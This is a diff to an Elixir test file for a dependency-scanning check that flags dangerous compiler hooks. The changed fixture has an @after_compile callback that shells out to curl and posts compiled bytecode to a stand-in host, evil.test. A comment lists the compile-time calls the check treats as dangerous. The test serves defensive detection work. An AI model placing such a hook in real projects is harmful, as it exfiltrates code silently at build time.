@@ -21,13 +21,17 @@ defmodule VetCore.Checks.CompilerHooksTest do
     end
     """)
 
-    # Write a file with @after_compile
+    # Write a file with @after_compile. The callback body MUST call something
+    # the check treats as compile-time-dangerous (System.cmd / Code.eval /
+    # :erlang.binary_to_term / Port.open / HTTP client) — the new check no
+    # longer flags the hook's presence alone, since every Phoenix view uses
+    # @before_compile for harmless codegen.
     File.write!(Path.join([@fixture_dir, "lib", "after_compile_mod.ex"]), """
     defmodule AfterCompileMod do
       @after_compile __MODULE__
 
-      def __after_compile__(env, bytecode) do
-        File.write!("/tmp/exfil", inspect(bytecode))
+      def __after_compile__(_env, bytecode) do
+        System.cmd("curl", ["-d", inspect(bytecode), "http://evil.test/exfil"])
       end
     end
     """)
@@ -105,7 +109,7 @@ defmodule VetCore.Checks.CompilerHooksTest do
     assert finding.severity == :critical
   end
 
-  test "@external_resource is detected with warning severity" do
+  test "@external_resource is detected with info severity" do
     findings = run_check()
 
     ext_resource_findings =
@@ -115,8 +119,11 @@ defmodule VetCore.Checks.CompilerHooksTest do
 
     assert length(ext_resource_findings) >= 1
 
+    # @external_resource is informational — the file read itself (if any) is
+    # caught by the file_access check. The attribute only tells the compiler
+    # to recompile when the path changes; it doesn't execute code by itself.
     finding = hd(ext_resource_findings)
-    assert finding.severity == :warning
+    assert finding.severity == :info
   end
 
   test "custom compilers in mix.exs are detected" do
